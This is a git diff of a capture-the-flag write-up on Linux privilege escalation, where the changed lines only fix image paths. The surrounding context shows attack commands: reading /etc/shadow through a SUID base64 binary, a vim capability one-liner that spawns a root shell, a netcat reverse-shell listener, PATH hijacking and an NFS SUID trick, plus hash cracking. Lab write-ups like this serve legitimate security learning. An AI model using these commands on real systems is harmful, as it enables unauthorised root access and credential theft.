@@ -278,7 +278,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
 i found my target !!
-![base64](../../photos/base64.png)
+![base64](base64.png)
 
 #### Let's read the shadow to get the hashes
 
@@ -288,7 +288,7 @@ base64 /etc/shadow | base64 -d
 
 and i found the desired hashes...
 
-![hash](../../photos/hash.png)
+![hash](photos/hash.png)
 
 
 #### Let's crack the hash of `user2`
@@ -310,7 +310,7 @@ There is a capability for `VIM`....
 ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
 #### The Flag...
-![root](../../photos/root.png)
+![root](root.png)
 
 ---
 # Privilege Escalation: `Cron Jobs`
@@ -336,11 +336,11 @@ nc -lvnp {port}
 
 Get matt's password by accessing `/etc/shadow` from the rooted `revshell`
 
-![matt](../../photos/matt.png)
+![matt](matt.png)
 
 and crack it by john...
 
-![jo](../../photos/jo.png)
+![jo](jo.png)
 
 ---
 # Privilege Escalation: PATH
@@ -353,13 +353,13 @@ find / -writable 2>/dev/null
 
 Found it !!
 
-![find.png](../../photos/find.png)
+![find.png](find.png)
 
 #### Now go to the directory and write the code
 
 As it appears test runs thm as a root...
 
-![test](../../photos/test.png)
+![test](photos/test.png)
 
 let's add a command to print the flag....
 
@@ -367,7 +367,7 @@ let's add a command to print the flag....
 echo 'cat /home/matt/flag6.txt' > thm
 ```
 
-![thm.png](../../photos/thm.png)
+![thm.png](thm.png)
 
 ---
 # Privilege Escalation: NFS
@@ -407,11 +407,11 @@ sudo chmod +s bb/rooted
 
 On host..
 
-![host.png](../../photos/host.png)
+![host.png](host.png)
 
 on Attacked Machine...
 
-![machine.png](../../photos/machine.png)
+![machine.png](machine.png)
 
 ---
 
@@ -424,17 +424,17 @@ find / -name flag1.txt 2>/dev/null
 
 And it is `base64`...
 
-![mhash.png](../../photos/mhash.png)
+![mhash.png](mhash.png)
 
 
 Cracking the hash...
 
-![hashed](../../photos/hashed.png)
+![hashed](hashed.png)
 
 Getting `flag1`
 
-![flag1.png](../../photos/flag1.png)
+![flag1.png](flag1.png)
 
 Using the `sudo` method and getting the `rootflag`..
 
-![rootf.png](../../photos/rootf.png)
+![rootf.png](rootf.png)
